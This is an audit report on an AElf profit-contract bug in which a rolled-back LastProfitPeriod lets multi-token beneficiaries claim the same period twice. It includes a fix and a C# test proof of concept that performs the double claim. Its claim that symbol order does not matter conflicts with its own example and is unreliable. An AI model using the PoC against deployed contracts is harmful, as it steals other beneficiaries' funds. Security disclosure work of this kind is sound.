# Audit Report

## Title
LastProfitPeriod Backwards Update Enables Double-Claiming of Profits in Multi-Token Schemes

## Summary
The `ProfitAllPeriods` function contains a critical logic error where a shared `lastProfitPeriod` variable is updated inside nested loops iterating over multiple token symbols. When processing symbols with uneven distribution patterns across periods, later-processed symbols overwrite `lastProfitPeriod` to a lower value, enabling beneficiaries to re-claim already-claimed periods and steal funds.

## Finding Description

The vulnerability exists in the `ProfitAllPeriods` private method where a local `lastProfitPeriod` tracking variable is initialized once but updated within nested loops processing multiple token symbols. [1](#0-0) 

The function processes profit claims across multiple token symbols (outer loop) and multiple periods (inner loop). [2](#0-1) 

For each period where a symbol has distributed profits, the code unconditionally updates the shared variable: `lastProfitPeriod = period + 1` after transferring funds. [3](#0-2) 

The critical flaw is that this shared variable gets overwritten by each symbol's processing loop. When Symbol A has distributions in periods 1-3 (setting `lastProfitPeriod = 4`), but Symbol B only has distributions in periods 1-2, Symbol B's processing overwrites the value to `lastProfitPeriod = 3`. The final value written to state is the last value assigned, not the maximum across all symbols.

While there is a `continue` statement that skips processing when a symbol doesn't have a distribution for a specific period, this only prevents the update for missing periods—it doesn't prevent overwrites when the symbol DOES have distributions in earlier periods. [4](#0-3) 

The final modified `profitDetail` with the incorrect `LastProfitPeriod` is written back. [5](#0-4) 

The `ClaimProfits` public method calls `ProfitAllPeriods` and then saves the updated `profitDetail` back to state, persisting the incorrect `LastProfitPeriod` value. [6](#0-5) [7](#0-6) 

Multi-token schemes are explicitly supported, with symbols added to `scheme.ReceivedTokenSymbols` when profits are contributed in different tokens. [8](#0-7) 

## Impact Explanation

**Direct Fund Theft**: This vulnerability allows a beneficiary to claim the same period's profits multiple times for symbols that were distributed in periods that get "rolled back" by the bug. The stolen funds come directly from the period's virtual address, depriving other beneficiaries of their rightful shares.

**Quantified Damage**: In a scheme where a beneficiary has 50% shares, Period 3 distributed 1000 ELF and 0 USDT, and Periods 1-2 distributed both tokens, the beneficiary should receive 500 ELF from period 3 once. With this vulnerability, after the first claim `LastProfitPeriod` incorrectly rolls back to 3, allowing a second claim that steals an additional 500 ELF from period 3.

**Affected Parties**: All other beneficiaries in the scheme lose their proportional shares as the total claimed exceeds what was distributed. The profit scheme's accounting integrity is violated as `LastProfitPeriod` no longer accurately tracks claimed periods.

**Severity**: HIGH - This enables direct, repeatable theft of funds with no special privileges required beyond being a registered beneficiary in a multi-token scheme.

## Likelihood Explanation

**Attacker Capabilities**: The attacker only needs to be a registered beneficiary in a profit scheme that tracks multiple token symbols. No manager privileges, organization approval, or role compromise is required.

**Attack Complexity**: LOW - The vulnerability triggers automatically during normal `ClaimProfits` operations when: (1) A profit scheme has multiple token symbols in its `ReceivedTokenSymbols` list, (2) Different periods have different symbols distributed (a natural operational pattern), and (3) The beneficiary calls the standard `ClaimProfits` method.

**Feasibility**: VERY HIGH - Multi-token profit schemes are fundamental to AElf's economic model, commonly tracking ELF, USDT, and other tokens. Distribution patterns naturally vary by period based on what tokens are contributed to the scheme at different times. The vulnerability exists regardless of symbol processing order.

**Detection Constraints**: The double-claim appears as legitimate `ClaimProfits` transactions. While `ProfitsClaimed` events will show the same period being claimed multiple times, this requires careful monitoring and understanding of the expected claim pattern. [9](#0-8) 

**Probability**: MEDIUM-HIGH - Occurs whenever multi-token schemes have uneven symbol distributions across periods, which is a realistic and common operational pattern in profit distribution systems.

## Recommendation

Replace the shared local `lastProfitPeriod` variable with logic that tracks the maximum period processed across all symbols. The fix should ensure `LastProfitPeriod` is only advanced forward, never rolled back:

```csharp
private Dictionary<string, long> ProfitAllPeriods(Scheme scheme, ProfitDetail profitDetail, Address beneficiary, long maxProfitReceivingPeriodCount,
    bool isView = false, string targetSymbol = null)
{
    var profitsMap = new Dictionary<string, long>();
    var lastProfitPeriod = profitDetail.LastProfitPeriod;

    var symbols = targetSymbol == null ? scheme.ReceivedTokenSymbols.ToList() : new List<string> { targetSymbol };

    foreach (var symbol in symbols)
    {
        var totalAmount = 0L;
        var targetPeriod = Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod);
        var maxProfitPeriod = profitDetail.EndPeriod == long.MaxValue
            ? Math.Min(scheme.CurrentPeriod - 1, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount))
            : Math.Min(targetPeriod, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount));
        
        for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
        {
            var periodToPrint = period;
            var detailToPrint = profitDetail;
            var distributedPeriodProfitsVirtualAddress =
                GetDistributedPeriodProfitsVirtualAddress(scheme.SchemeId, period);
            var distributedProfitsInformation =
                State.DistributedProfitsMap[distributedPeriodProfitsVirtualAddress];
            if (distributedProfitsInformation == null || distributedProfitsInformation.TotalShares == 0 ||
                !distributedProfitsInformation.AmountsMap.Any() ||
                !distributedProfitsInformation.AmountsMap.ContainsKey(symbol))
                continue;

            var amount = SafeCalculateProfits(profitDetail.Shares,
                distributedProfitsInformation.AmountsMap[symbol], distributedProfitsInformation.TotalShares);

            if (!isView)
            {
                Context.LogDebug(() =>
                    $"{beneficiary} is profiting {amount} {symbol} tokens from {scheme.SchemeId.ToHex()} in period {periodToPrint}." +
                    $"Sender's Shares: {detailToPrint.Shares}, total Shares: {distributedProfitsInformation.TotalShares}");
                if (distributedProfitsInformation.IsReleased && amount > 0)
                {
                    if (State.TokenContract.Value == null)
                        State.TokenContract.Value =
                            Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

                    Context.SendVirtualInline(
                        GeneratePeriodVirtualAddressFromHash(scheme.SchemeId, period),
                        State.TokenContract.Value,
                        nameof(State.TokenContract.Transfer), new TransferInput
                        {
                            To = beneficiary,
                            Symbol = symbol,
                            Amount = amount
                        }.ToByteString());

                    Context.Fire(new ProfitsClaimed
                    {
                        Beneficiary = beneficiary,
                        Symbol = symbol,
                        Amount = amount,
                        ClaimerShares = detailToPrint.Shares,
                        TotalShares = distributedProfitsInformation.TotalShares,
                        Period = periodToPrint
                    });
                }

                // FIX: Use Math.Max to ensure lastProfitPeriod only moves forward
                lastProfitPeriod = Math.Max(lastProfitPeriod, period + 1);
            }

            totalAmount = totalAmount.Add(amount);
        }

        profitsMap.Add(symbol, totalAmount);
    }

    profitDetail.LastProfitPeriod = lastProfitPeriod;

    return profitsMap;
}
```

The key change is replacing `lastProfitPeriod = period + 1` with `lastProfitPeriod = Math.Max(lastProfitPeriod, period + 1)` to ensure the variable only advances forward and never rolls back.

## Proof of Concept

```csharp
[Fact]
public async Task ProfitContract_MultiToken_DoubleClaimVulnerability_Test()
{
    // Setup: Create scheme and add beneficiary
    var creator = Creators[0];
    var beneficiary = Normal[0];
    var beneficiaryAddress = Address.FromPublicKey(NormalKeyPair[0].PublicKey);
    
    var schemeId = await CreateSchemeAsync();
    
    // Add beneficiary with 50% shares (100 out of 200 total)
    await creator.AddBeneficiary.SendAsync(new AddBeneficiaryInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare
        {
            Beneficiary = beneficiaryAddress,
            Shares = 100
        },
        EndPeriod = long.MaxValue
    });
    
    // Add dummy beneficiary for other 50%
    await creator.AddBeneficiary.SendAsync(new AddBeneficiaryInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare
        {
            Beneficiary = Starter,
            Shares = 100
        },
        EndPeriod = long.MaxValue
    });
    
    // Period 1: Distribute both ELF and USDT
    await creator.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeId = schemeId,
        Amount = 1000,
        Symbol = "ELF",
        Period = 1
    });
    await creator.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeId = schemeId,
        Amount = 1000,
        Symbol = "USDT",
        Period = 1
    });
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 1,
        AmountsMap = { { "ELF", 1000 }, { "USDT", 1000 } }
    });
    
    // Period 2: Distribute both ELF and USDT
    await creator.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeId = schemeId,
        Amount = 1000,
        Symbol = "ELF",
        Period = 2
    });
    await creator.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeId = schemeId,
        Amount = 1000,
        Symbol = "USDT",
        Period = 2
    });
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 2,
        AmountsMap = { { "ELF", 1000 }, { "USDT", 1000 } }
    });
    
    // Period 3: Distribute ONLY ELF (no USDT)
    await creator.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeId = schemeId,
        Amount = 1000,
        Symbol = "ELF",
        Period = 3
    });
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 3,
        AmountsMap = { { "ELF", 1000 } }
    });
    
    // First claim - should get profits from periods 1, 2, 3
    var balanceBefore = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = "ELF"
    })).Balance;
    
    await beneficiary.ClaimProfits.SendAsync(new ClaimProfitsInput
    {
        SchemeId = schemeId
    });
    
    var balanceAfter = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = "ELF"
    })).Balance;
    
    var firstClaim = balanceAfter - balanceBefore;
    firstClaim.ShouldBe(1500); // 500 from each of periods 1, 2, 3
    
    // Check LastProfitPeriod - BUG: it will be 3 instead of 4
    var profitDetails = await beneficiary.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = schemeId,
        Beneficiary = beneficiaryAddress
    });
    
    // This assertion FAILS due to the bug - LastProfitPeriod is incorrectly 3
    // It should be 4 but USDT's loop overwrote it to 3
    profitDetails.Details[0].LastProfitPeriod.ShouldBe(4); // This will FAIL - actual value is 3
    
    // Second claim - SHOULD NOT get any more funds, but WILL due to bug
    balanceBefore = balanceAfter;
    await beneficiary.ClaimProfits.SendAsync(new ClaimProfitsInput
    {
        SchemeId = schemeId
    });
    
    balanceAfter = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = "ELF"
    })).Balance;
    
    var secondClaim = balanceAfter - balanceBefore;
    
    // VULNERABILITY: Second claim steals another 500 ELF from period 3
    secondClaim.ShouldBe(0); // This will FAIL - actual value is 500 (double-claim!)
    
    // Total stolen: beneficiary got 2000 ELF instead of 1500
}
```

## Notes

This vulnerability is particularly insidious because it triggers automatically during normal operations without any malicious input manipulation. The bug occurs in the core period tracking logic and affects all multi-token profit schemes where different tokens have different distribution patterns across periods—a common scenario in real-world deployments. The fix is straightforward: ensure `lastProfitPeriod` only advances forward by using `Math.Max` when updating it.

### Citations

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L716-716)
```csharp
        if (!scheme.ReceivedTokenSymbols.Contains(input.Symbol)) scheme.ReceivedTokenSymbols.Add(input.Symbol);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L784-784)
```csharp
            ProfitAllPeriods(scheme, profitDetail, beneficiary, maxProfitReceivingPeriodCount);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L806-806)
```csharp
        State.ProfitDetailsMap[input.SchemeId][beneficiary] = new ProfitDetails { Details = { availableDetails } };
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L849-849)
```csharp
        var lastProfitPeriod = profitDetail.LastProfitPeriod;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L853-860)
```csharp
        foreach (var symbol in symbols)
        {
            var totalAmount = 0L;
            var targetPeriod = Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod);
            var maxProfitPeriod = profitDetail.EndPeriod == long.MaxValue
                ? Math.Min(scheme.CurrentPeriod - 1, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount))
                : Math.Min(targetPeriod, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount));
            for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L868-871)
```csharp
                if (distributedProfitsInformation == null || distributedProfitsInformation.TotalShares == 0 ||
                    !distributedProfitsInformation.AmountsMap.Any() ||
                    !distributedProfitsInformation.AmountsMap.ContainsKey(symbol))
                    continue;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L897-905)
```csharp
                        Context.Fire(new ProfitsClaimed
                        {
                            Beneficiary = beneficiary,
                            Symbol = symbol,
                            Amount = amount,
                            ClaimerShares = detailToPrint.Shares,
                            TotalShares = distributedProfitsInformation.TotalShares,
                            Period = periodToPrint
                        });
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L908-908)
```csharp
                    lastProfitPeriod = period + 1;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L917-917)
```csharp
        profitDetail.LastProfitPeriod = lastProfitPeriod;
```
